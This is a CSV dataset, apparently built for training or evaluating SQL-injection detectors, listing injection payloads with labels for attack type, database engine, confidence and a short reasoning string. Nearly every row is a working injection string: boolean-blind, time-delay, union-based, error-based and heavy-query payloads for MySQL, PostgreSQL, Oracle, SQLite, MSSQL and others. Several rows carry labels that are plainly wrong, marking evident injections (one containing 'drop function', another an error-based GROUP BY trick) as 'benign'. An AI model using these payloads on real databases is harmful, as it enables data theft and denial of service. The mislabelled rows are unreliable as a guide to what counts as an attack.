id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
21370,"1"" ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""lano"" = ""lano",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21371,1' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'psdl' like 'psdl,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21372,"1"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""oyxk"" = ""oyxk",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21373,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 7711 = 7711",time_blind,sqlite,0.95,DB signature: sqlite; time-delay observable in response timing,2
21374,"-6600' ) union all select 5566,5566#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21375,1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),time_blind,generic,0.95,Pattern: time_blind; time-delay observable in response timing,2
21376,"-9721' or elt ( 9511 = 9238,9238 )",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21377,"1' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )",boolean_blind,mysql,0.95,DB signature: mysql; conditional True/False branch execution,2
21378,"1%"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,generic,0.95,Pattern: time_blind; time-delay observable in response timing,2
21379,"select pg_sleep ( 5 ) and ""ilyw"" like ""ilyw",time_blind,postgresql,0.95,'pg_sleep()' PostgreSQL delay; DB signature: postgresql,2
21380,-2820' ) ) or 6679 = 8848--,boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21381,"-6453"" ) ) as hehs where 9363 = 9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21382,"1"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""zwov"" = ""zwov",boolean_blind,postgresql,0.85,'AND N=...' boolean condition; DB signature: postgresql,1
21383,1' ) ) as oyad where 7161 = 7161 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21384,"1 ) ) as kgit where 1919 = 1919 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21385,1 ) ) as mcyh where 1001 = 1001,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21386,"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and 'usnh' like 'usnh",boolean_blind,mysql,0.95,DB signature: mysql; conditional True/False branch execution,2
21387,"1%"" ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21388,"-5207 ) where 6987 = 6987 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21389,"-1287"" ) as bbzg where 1475 = 1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21390,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'fpaf' = 'fpaf",boolean_blind,sqlite,0.85,DB signature: sqlite; conditional True/False branch execution,1
21391,"1"" ) ) ) and sleep ( 5 ) and ( ( ( ""bvgg"" = ""bvgg",time_blind,generic,0.95,Pattern: time_blind; time-delay observable in response timing,2
21392,1 and 7533 = 7533-- spzi,boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21393,"-1644%' or make_set ( 9354 = 9354,7185 ) and '%' = '",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21394,"1 where 4331 = 4331 union all select null,null,null,null,null,null#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21395,1 ) as qort where 1554 = 1554,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21396,"1"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",boolean_blind,oracle,0.85,'AND N=...' boolean condition; DB signature: oracle,1
21397,1 ) where 5418 = 5418 union all select null--,union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21398,1' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'eocx' = 'eocx,boolean_blind,oracle,0.75,'AND N=...' boolean condition; DB signature: oracle,1
21399,"1"" where 4294 = 4294 and make_set ( 2543 = 7988,7988 ) --",boolean_blind,generic,1.0,Pattern: boolean_blind; conditional True/False branch execution,3
21400,1' ) ) and 4595 = 4595#,boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21401,-6680' ) or 5483 = 3031 and ( 'zxes' = 'zxes,boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21402,"1', ( select ( case when ( 2073 = 5314 ) then 1 else 1/ ( select 0 ) end ) )",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21403,"1' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",boolean_blind,sqlite,0.85,'AND N=...' boolean condition; DB signature: sqlite,1
21404,"1"" ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""sjiz"" like ""sjiz",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21405,1' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'pneh' like 'pneh,boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21406,"1 ) where 4768 = 4768 union all select null,null,null,null,null,null,null,null#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21407,1' ) where 5286 = 5286,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21408,1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 'ytxg' = 'ytxg,time_blind,generic,0.95,Pattern: time_blind; time-delay observable in response timing,2
21409,"1%"" ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21410,"1%' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( '%' = '",boolean_blind,oracle,0.85,'OR N=...' boolean condition; DB signature: oracle,1
21411,"1%"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""%"" = """,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21412,1'+ ( select hvsb where 3666 = 3666,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21413,if ( 2697 = 2008 ) select 2697 else drop function jcoo--,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21414,"1 where 6119 = 6119 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21415,-8710 or 9323 = 9323#,boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21416,1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'zoin' = 'zoin,boolean_blind,postgresql,0.95,'AND N=...' boolean condition; DB signature: postgresql,2
21417,"-7996"" ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""iuzv"" like ""iuzv",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21418,"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""knbx"" = ""knbx",time_blind,generic,0.95,Pattern: time_blind; time-delay observable in response timing,2
21419,"1' ) ) as fjbe where 4662 = 4662 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21420,"-5732' ) union all select 7614,7614,7614,7614--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21421,"1"" union all select null,null,null,null,null--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21422,-4157' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'rdhm' = 'rdhm,boolean_blind,oracle,0.75,'OR N=...' boolean condition; DB signature: oracle,1
21423,"-7412"" ) as qngt where 2041 = 2041 union all select 2041--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21424,"-8673"" ) or make_set ( 9354 = 9354,7185 ) and ( ""edap"" like ""edap",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21425,"1"" order by 1--",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,3
21426,"-4721' ) or elt ( 4378 = 5165,5165 ) and ( 'fufn' = 'fufn",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21427,"1 ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 2748 = 2748",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21428,"1"" ) where 9648 = 9648 and elt ( 1210 = 1210,sleep ( 5 ) ) --",boolean_blind,generic,1.0,Pattern: boolean_blind; conditional True/False branch execution,3
21429,"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""fpwu"" like ""fpwu",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21430,"-5294%"" ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""%"" = """,boolean_blind,oracle,0.95,'OR N=...' boolean condition; DB signature: oracle,2
21431,"1 ) where 2741 = 2741 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21432,"1, ( select * from generate_series ( 9108,9108,case when ( 9108 = 2900 ) then 1 else 0 end ) limit 1 )",heavy_query,postgresql,0.75,DB signature: postgresql; denial-of-service via resource exhaustion,1
21433,"-3620'|| ( select 'kmei' where 8533 = 8533 union all select 8533,8533,8533,8533--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21434,"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ibdj' = 'ibdj",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21435,-9327' ) or 3038 = 3038,boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21436,"-9829' ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21437,begin user_lock.sleep ( 5 ),time_blind,generic,0.95,Pattern: time_blind; time-delay observable in response timing,2
21438,"1"" ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21439,"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'toft' = 'toft",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21440,"1' where 1602 = 1602 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21441,1 ) where 9167 = 9167,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21442,"1"" ) as dien where 4022 = 4022",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21443,1 ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,boolean_blind,postgresql,0.95,'AND N=...' boolean condition; DB signature: postgresql,2
21444,"-1083%"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""%"" = """,boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21445,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""dwbh"" like ""dwbh",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21446,"-9197%"" ) ) ) union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21447,"1%"" ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """,boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21448,1'|| ( select 'tezo' from dual where 4436 = 4436,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21449,"-8684 union all select 9519,9519,9519,9519--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21450,1' ) ) as zari where 6847 = 6847,benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,2
21451,"-9588' ) ) union all select 7280,7280,7280,7280,7280,7280,7280,7280,7280,7280--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21452,"1' or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",boolean_blind,sqlite,0.85,'OR N=...' boolean condition; DB signature: sqlite,1
21453,"1"" ) as rbgl where 3822 = 3822 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,mysql,0.95,'extractvalue()' XPath error; DB signature: mysql; database error message analysis method,2
21454,"-3781 ) union all select 3916,3916,3916--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21455,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ""seci"" = ""seci",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,1
21456,"-5849 ) union all select 6168,6168,6168,6168,6168,6168,6168,6168#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21457,"1"" ) ) union all select null,null,null,null,null,null--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21458,"1' ) as ildf where 5545 = 5545 union all select null,null,null,null#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21459,"-3955 where 7276 = 7276 union all select 7276,7276,7276,7276,7276,7276,7276,7276,7276--",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21460,"1"" ) union all select null,null,null,null,null#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21461,"-3415 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) -- jove",boolean_blind,generic,0.75,'OR N=...' boolean condition; conditional True/False branch execution,1
21462,"1' ) as jwvp where 5231 = 5231 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21463,"1"" ) as ubva where 6369 = 6369 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21464,1 ) as nwfz where 7365 = 7365 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,boolean_blind,oracle,0.75,'AND N=...' boolean condition; DB signature: oracle,1
21465,"1"" ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21466,"1%' ) and make_set ( 1458 = 3902,3902 ) and ( '%' = '",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21467,"-2289"" ) or 8624 = 6279 and ( ""ised"" = ""ised",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
21468,"1%' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21469,"1%' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( '%' = '",boolean_blind,generic,1.0,'AND N=...' boolean condition; conditional True/False branch execution,3
21470,"-6412 ) ) as cnfs where 6557 = 6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",union_based,generic,1.0,'UNION SELECT' clause; column count validation required,3
21471,"1%' ) ) and make_set ( 8403 = 8403,8899 ) and ( ( '%' = '",boolean_blind,generic,0.95,Pattern: boolean_blind; conditional True/False branch execution,2
21472,"1%"" ) ) )",benign,generic,1.0,No SQLi injection signals detected; valid SQL syntax without boolean expressions or meta-access patterns,3
21473,"1'+ ( select 'ndpx' where 4061 = 4061 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,generic,1.0,'OR N=...' boolean condition; conditional True/False branch execution,3
